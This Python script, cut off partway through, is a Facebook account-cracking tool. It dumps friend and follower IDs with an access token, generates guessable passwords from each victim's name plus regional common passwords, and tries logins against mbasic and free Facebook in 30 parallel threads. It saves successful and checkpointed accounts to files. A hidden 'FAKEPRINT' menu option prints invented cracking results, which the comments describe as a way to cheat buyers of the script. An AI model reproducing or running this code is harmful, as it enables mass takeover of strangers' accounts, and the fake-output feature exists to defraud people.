#WARNA-PYTHON
q="\033[00m"
h2="\033[40m"
b2="\033[44m"
c2="\033[46m"
i2="\033[42m"
u2="\033[45m"
m2="\033[41m"
p2="\033[47m"
k2="\033[43m"
b='\033[0;94m'
i='\033[0;92m'
c='\033[0;96m'
m='\033[0;91m'
u='\033[0;95m'
k='\033[0;93m'
p='\033[0;97m'
h='\033[0;90m'
#python2-utf-8
#Script By Mr.Risky
#GITHUB.COM/DUMAI-991
#WA.ME/6283143565470
##############################################################################
#IMPORT
import itertools, threading, os, requests, bs4, sys, os, subprocess, random, time, re, json
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from time import sleep
from requests import Session
from sys import exit as keluar
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from sys import stdout
from os import system
import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
current = datetime.now()

#BAHANTAMBAHAN
me = ("Mr.Risky")
no_me = ("6283143565470")
email_me = ("santuyaja019@gmail.com")
facebook_me = ("Https://M.Facebook.Com/llovexnxx")
github_me = ("Https://Github.Com/Dumai-991")
team = ("Angga, Yayan, Dapunta And Risky")

#p = "\x1b[0;37m" # putih
p = "\x1b[0;33m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\033[0;36m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\033[0;32m" # biru muda
#p = "\x1b[0;37m" # putih
#m = "\x1b[0;31m" # merah
#h = "\x1b[0;32m" # hijau
#k = "\x1b[0;32m" # kuning
#b = "\x1b[0;34m" # biru
#u = "\x1b[0;35m" # ungu
#o = "\x1b[0;36m" # biru muda

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[0m"
        O = "\033[0m"
        R = "\033[0m"
#        N = "\033[0m"
#        G = "\033[1;92m"
#        O = "\033[1;93m"
#        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""
#SETINGAN-SCRIPT-SMBF-VVIP

logo = ("""
ANGGAP-AJA-LOGO
""")



##############################################################################
#			      !!!! WARNING !!!!				     #
# 1. Jika Terjadi Masalah Terhadap Script Mau Pun Folder Hp Kamu Rusak Kami- #
# -. Tidak Tanggu Jawab :(						     #
# 2. Jika Anda Mau Edit Script Engga Apa. Tapi Jangan DiUbah Bot_Facebooknya #
##############################################################################


def results(Dapunta,Krahkrah):
        if len(Dapunta) !=0:
                print(("[OK] : "+str(len(Dapunta))))
        if len(Krahkrah) !=0:
                print(("[CP] : "+str(len(Krahkrah))))
        if len(Dapunta) ==0 and len(Krahkrah) ==0:
                print("\n")
                print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
def mbasic(em,pas,hosts):
	ua = open('ua_me.txt', 'r').read()
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

def f_fb(em,pas,hosts):
	ua = open('ua_me.txt', 'r').read()
	r=requests.Session()
	r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}


def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("[!] Wrong Cookies")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()

def hdcok():
	global host
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
def country():
    os.system("clear")
    banner()
    jalan(f"{c}Made By Dapunta{q}")
    print("\n%s[%s Choose Country %s]\n"%(k,p,k))
    print("%s[%s1%s] %sIndonesia"%(k,p,k,p))
    print("%s[%s2%s] %sBangladesh/India"%(k,p,k,p))
    print("%s[%s3%s] %sPakistan"%(k,p,k,p))
    print("%s[%s4%s] %sUSA"%(k,p,k,p))
    choose_country()
    
def choose_country():
    cc = input("\n%s[%s•%s] %sChoose : "%(k,p,k,p))
    if cc in[""]:
        print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
    elif cc in["1","01"]:
        os.system("rm -rf .pass.txt")
        cou = "id"
        try:
            ctry = open('.pass.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    elif cc in["2","02"]:
        os.system("rm -rf .pass.txt")
        cou = "bd"
        try:
            ctry = open('.pass.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    elif cc in["3","03"]:
        os.system("rm -rf .pass.txt")
        cou = "pk"
        try:
            ctry = open('.pass.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    elif cc in["4","04"]:
        os.system("rm -rf .pass.txt")
        cou = "us"
        try:
            ctry = open('.pass.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    else:
        print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))

def bash(dum):
	os.system(dum)

def banner():
    print(f"""{c}______________  ___________ __________
{c}__  ___/___   |/  /___  __ )___  ____/{q}|{m}Author:{c}{me}
{c}_____ \ __  /|_/ / __  __  |__  /_    {q}|{m}WA :{c}{no_me}
{c}____/ / _  /  / /  _  /_/ / _  __/    {q}|{m}FB :{c}{facebook_me}
{c}/____/  /_/  /_/   /_____/  /_/       {q}|{m}GL :{c}{email_me}
{q}Thanks To : {i}{team}""")

host="https://mbasic.facebook.com"
ips=None
try:
	b=requests.get("http://ip-api.com/json/").json()["query"]
	ips=requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["country"].lower()
except:
	ips=None

ok = []
cp = []
ttl =[]

durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
def menu():
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e))
        logs()
    ip = requests.get("https://api.ipify.org").text
    ngr = open('.pass.txt', 'r').read()
    if "id" in ngr:
        negara = "Indonesia"
    elif "bd" in ngr:
        negara = "Bangladesh/India"
    elif "pk" in ngr:
        negara = "Pakistan"
    elif "us" in ngr:
        negara = "USA"
    os.system("clear")
    banner()
#    print((k+"\n[ "+p+"Welcome "+a["name"]+k+" ]"+p))
    print((k+"\n["+p+"++"+k+"]"+p+" Your ID : "+id))
    print((k+"["+p+"++"+k+"]"+p+" Your IP : "+ip))
    print((k+"["+p+"++"+k+"]"+p+" Status  : "+i+"Trial"+p))
    print((k+"["+p+"••"+k+"]"+u+"==================================================="+c+"⟩⟩"))
    print((k+"\n["+p+"01"+k+"]"+p+" Crack ID From Public/Friend"))
    print((k+"["+p+"02"+k+"]"+p+" Crack ID From Followers"))
    print((k+"["+p+"03"+k+"]"+p+" Crack ID From FileList"))
    print((k+"["+p+"04"+k+"]"+p+" View Crack Results"))
    print((k+"["+p+"05"+k+"]"+p+" Settings User Agent"))
    print((k+"["+p+"00"+k+"]"+p+" Logout (REMOVE TOKEN)"))
    choose_menu()

def choose_menu():
	r=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
	if r=="":
		print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
		menu()
	elif r=="1" or r=="01":
		publik()
	elif r=="2" or r=="02":
		follow()
	elif r=="3" or r=="03":
		print(c+"FILE UNTUK DIHACK YANG TERSEDIA -->"+k),;os.system("ls *.json")
		jalan(k+'['+p+'•'+k+'] '+p+'Masukan Nama Filenya.. Contoh : Risky.json'+q)
		dumai = input(k+'['+p+'•'+k+']'+p+' Nama File : '+q)
		filecoba(dumai)
	elif r=="4" or r=="04":
		ress()
	elif r=="5" or r=="05":
		os.system("rm -rf ua_me.txt")
		menu_user_agent()
	elif r=="FAKEPRINT":
		print(f"""
[•] Followers ID Target : 53726XXXX
[•] Name : Eliot Cuduco
[•] Total ID : 5000

[1] Api ( Fast )
[2] Mbasic ( Slow )

[•] Choose : 1

[•] Crack Started...
[•] Account [OK] Saved to : OK.txt
[•] Account [×] Saved to : CP.txt

{i} [OK] 100037259232339|siti123
 [OK] 100058400629614|ujang123{k}
 [×] 100028447006914|piyon123
 [×] 100025178990640|aila123
 [×] 100044328361757|mesy123
 [×] 100006960191111|ouss12345
 [×] 100014229344949|sasa12345
 [×] 100026905057587|puput12345
 [×] 100018776192587|shaila123
 [×] 100012728401403|nila12345
 [×] 100010124674535|rani12345
 [×] 100014458861212|mbahcemplung123
{i} [OK] 100019549012335|akbar12345{k}
 [×] 100020038388267|amir12345
 [×] 100012505441442|nuris123
 [×] 100038464481741|aram12345
 [×] 100055597927243|yuliana123
 [×] 100021522786578|raisa123
 [×] 100006512680343|dwi123
 [×] 100011104141390|alma12345
 [×] 100054324525507|yanti123
 [×] 100066751156637|adan123
 [×] 100016310497928|achmad123
 [×] 100023459116918|penduxs123
 [×] 100036042847438|aldo123
{i} [OK] 100004574927001|wandi123
 [OK] 100037100204160|nenih123{k}
 [×] 100023998988274|asepbr123
 [×] 100033654229416|chaca123
 [×] 100002470377268|naen12345
[Crack] 1522/3451 [OK : 3] [CP : 15]
 [×] 100005874422014|winda12345
 [×] 100007227756450|lilis123
 [×] 100023546973075|nayla123
 [×] 100056647249868|upik123
 [×] 100012132816945|hana123
 [×] 100013854549610|andini123
 [×] 100066746546299|rap123
 [×] 100011944244184|etoy12345
{i} [OK] 100038875597090|ningsih12345{k}
[Crack] 1522/3451 [OK : 5] [CP : 27]""")  ### Untuk Pelaris Sc :)

####---UNTUK SEBAGAI PENIPU---###
####---MASUKAN IDNYA :)---#######
	elif r=="0" or r=="00":
		try:
			jalan(k+"\n["+p+"•"+k+"]"+p+" Terima Kasih Telah Menggunakan Script Kami..")
			os.system("rm -rf login.txt")
			exit()
		except Exception as e:
			print((k+"["+p+"!"+k+"]"+p+" Error %s"%e))
	else:
		print((k+"["+p+"!"+k+"]"+p+" Wrong Input"))
		menu()	
def Get_Ua():
	menu_user_agent()

def menu_user_agent():
	ua_ris=("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	ua_ang=("Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4")
	ua_dam=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	try:
		toket=open("ua_me.txt","r").read()
	except IOError:
		os.system("rm -rf ua_me.txt")
		jalan("User Agent Broken")
		jalan(c+"Created By Risky")
		print(k+"Silahkan Pilih User Agent Untuk DiGunakan !!")
		print(k+"Please Select A User Agent To Use\n"+p)
		print(k+"["+p+"01"+k+"]"+p+" Made by Risky")
		print(k+"["+p+"02"+k+"]"+p+" Made by Dapunta")
		print(k+"["+p+"03"+k+"]"+p+" Made by Angga")
		print(k+"["+p+"04"+k+"]"+p+" Change User Agent")
		v=input("Choose : ")
		if v=="1" or v=="01":
			os.system("rm -rf ua_me.txt")
			ppx=open("ua_me.txt", "w")
			ppx.write(ua_ris)
			ppx.close()
		elif v=="2" or v=="02":
			os.system("rm -rf ua_me.txt")
			ppx=open("ua_me.txt", "w")
			ppx.write(ua_ris)
			ppx.close()
		elif v=="3" or v=="03":
			os.system("rm -rf ua_me.txt")
			ppx=open("ua_me.txt", "w")
			ppx.write(ua_ris)
			ppx.close()
		elif v=="4" or v=="04":
			os.system("rm -rf ua_me.txt")
			xx=input("Login Your User Agent User : ")
			ppx=open("ua_me.txt", "w")
			ppx.write(xx)
			ppx.close()
		else:
			print("Failed to Choose")
	
def filecoba(risky):
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		id = []
		qq = (risky).replace(" ","_")
		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(qq))))
		return pilihcrack(qq)
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)
def follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		print(k+"["+p+"!"+k+"]"+p+" Cookie/Token Rusak")
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input(k+"\n["+p+"•"+k+"]"+p+" Followers ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
			print((k+"\n[ "+p+"Back"+k+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)
def Khusus():
	print(f"{war}Ketik ( menu ) Untuk Kembali KeMenu Utaman")
	idt = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 01 : ")
	idt2 = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 02 : ")
	idt3 = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 03 : ")
	idt4 = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 04 : ")
	idt5 = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 05 : ")
	jalan(k+"["+p+"•"+k+"]"+p+" Recommended For 1500 Dump ID")
	max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		print(k+"["+p+"!"+k+"]"+p+" Cookie/Token Rusak")
		os.system("rm -rf login.txt")
		logs()
	try:
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
			print((k+"\n[ "+p+"Back"+k+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+max_id+"&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
#		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
		try:
			try:
				jok = requests.get("https://graph.facebook.com/"+idt2+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
			except KeyError:
				print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
				print((k+"\n[ "+p+"Back"+k+" ]"+p))
				publik()
				r=requests.get("https://graph.facebook.com/"+idt2+"/subscribers?limit="+max_id+"&access_token="+toket)
			z=json.loads(r.text)
			ys = open(qq , "a+")#.replace(" ","_")
			for a in z["data"]:
				id.append(a["id"]+"<=>"+a["name"])
				ys.write(a["id"]+"<=>"+a["name"]+"\n")
			ys.close()
#			print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
			try:
				try:
					jok = requests.get("https://graph.facebook.com/"+idt3+"?access_token="+toket)
					op = json.loads(jok.text)
					print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
				except KeyError:
					print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
					print((k+"\n[ "+p+"Back"+k+" ]"+p))
					publik()
					r=requests.get("https://graph.facebook.com/"+idt3+"/subscribers?limit="+max_id+"&access_token="+toket)
				z=json.loads(r.text)
				ys = open(qq , "a+")#.replace(" ","_")
				for a in z["data"]:
					id.append(a["id"]+"<=>"+a["name"])
					ys.write(a["id"]+"<=>"+a["name"]+"\n")
				ys.close()
				print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
				try:
					try:
						jok = requests.get("https://graph.facebook.com/"+idt3+"?access_token="+toket)
						op = json.loads(jok.text)
						print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
					except KeyError:
						print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
						print((k+"\n[ "+p+"Back"+k+" ]"+p))
						publik()
						r=requests.get("https://graph.facebook.com/"+idt3+"/subscribers?limit="+max_id+"&access_token="+toket)
					z=json.loads(r.text)
					ys = open(qq , "a+")#.replace(" ","_")
					for a in z["data"]:
						id.append(a["id"]+"<=>"+a["name"])
						ys.write(a["id"]+"<=>"+a["name"]+"\n")
					ys.close()
					print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
					try:
						try:
							jok = requests.get("https://graph.facebook.com/"+idt3+"?access_token="+toket)
							op = json.loads(jok.text)
							print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
						except KeyError:
							print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
							print((k+"\n[ "+p+"Back"+k+" ]"+p))
							publik()
							r=requests.get("https://graph.facebook.com/"+idt3+"/subscribers?limit="+max_id+"&access_token="+toket)
						z=json.loads(r.text)
						ys = open(qq , "a+")#.replace(" ","_")
						for a in z["data"]:
							id.append(a["id"]+"<=>"+a["name"])
							ys.write(a["id"]+"<=>"+a["name"]+"\n")
						ys.close()
						print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
						try:
							try:
								jok = requests.get("https://graph.facebook.com/"+idt5+"?access_token="+toket)
								op = json.loads(jok.text)
								print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
							except KeyError:
								print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
								print((k+"\n[ "+p+"Back"+k+" ]"+p))
								publik()
								r=requests.get("https://graph.facebook.com/"+idt5+"/subscribers?limit="+max_id+"&access_token="+toket)
							z=json.loads(r.text)
							ys = open(qq , "a+")#.replace(" ","_")
							for a in z["data"]:
								id.append(a["id"]+"<=>"+a["name"])
								ys.write(a["id"]+"<=>"+a["name"]+"\n")
							ys.close()
							print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
							return pilihcrack(qq)
						except Exception as e:
							exit(k+"["+p+"!"+k+"]"+p+" Error : "+e)
					except Exception as e:
						exit(k+"["+p+"!"+k+"]"+p+" Error : "+e)
				except Exception as e:
					exit(k+"["+p+"!"+k+"]"+p+" Error : "+e)
			except Exception as e:
				exit(k+"["+p+"!"+k+"]"+p+" Error : "+e)
		except Exception as e: 
			exit(k+"["+p+"!"+k+"]"+p+" Error : "+e)
	except Exception as e: 
		exit(k+"["+p+"!"+k+"]"+p+" Error : "+e)
def publik():
	try:
		toket=open("login.txt","r").read()
	except IOError:
#		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		print(k+"["+p+"!"+k+"]"+p+" Cookie/Token Rusak")
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		print((k+"\n["+p+"•"+k+"]"+p+" Type \'me\' To Dump From Friendlist"))
		idt = input(k+"["+p+"•"+k+"]"+p+" User ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
			print((k+"\n[ "+p+"Back"+k+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=5000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)
def pilihcrack(file):
  print((k+"\n["+p+"1"+k+"]"+p+" Api "))
#  print((k+"["+p+"2"+k+"]"+p+" Api + TTL ("+k+"Fast"+p+")"))
  print((k+"["+p+"2"+k+"]"+p+" Mbasic "))
#  print((k+"["+p+"4"+k+"]"+p+" Mbasic + TTL ("+k+"Slow"+p+")"))
#  print((k+"["+p+"5"+k+"]"+p+" Free Facebook ("+k+"Super Slow"+p+")"))
  krah=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
  if krah in[""]:
    print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
    pilihcrack(file)
  elif krah in["1","01"]:
    bapi(file)
#  elif krah in["2","02"]:
    bapittl(file)
  elif krah in["2","02"]:
    crack(file)
#  elif krah in["4","04"]:
    crackttl(file)
#  elif krah in["5","05"]:
    crackffb(file)
  else:
    print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
    pilihcrack(file)
def generate(text):
	results=[]
	ct = open('.pass.txt', 'r').read()
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
			else:
				results.append(i+"321")
				results.append(i+"54321")
				results.append(i)
				if "id" in ct:
					results.append("sayang")
					results.append("bismillah")
					results.append("anjing")
					results.append("kontol")
					results.append("indonesia")
					results.append("bajingan")
					results.append("123456")
				elif "bd" in ct:
					results.append("786786")
					results.append("000786")
					results.append("102030")
					results.append("556677")
				elif "pk" in ct:
					results.append("pakistan")
					results.append("786786")
					results.append("000786")
				elif "us" in ct:
					results.append("123456")
					results.append("qwerty")
					results.append("iloveyou")
					results.append("passwords")
	return results
class bapi:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    print(("\n"+k+"["+p+"•"+k+"]"+p+" Do You Want To Use Manual Password?? "+k+"[ "+h+"Y/n"+k+" ]"+p))
    while True:
      f=input(k+"["+p+"•"+k+"]"+p+" Dumai-991 ?: ")
      if f in[""," "]:
        print((k+"["+p+"!"+k+"]"+p+" Invalid Number"))
        continue
      elif f in["y","Y"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : Hasil/OK-"+durasi+".txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : Hasil/CP-"+durasi+".txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["n","N"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : Hasil/OK-"+durasi+".txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : Hasil/CP-"+durasi+".txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
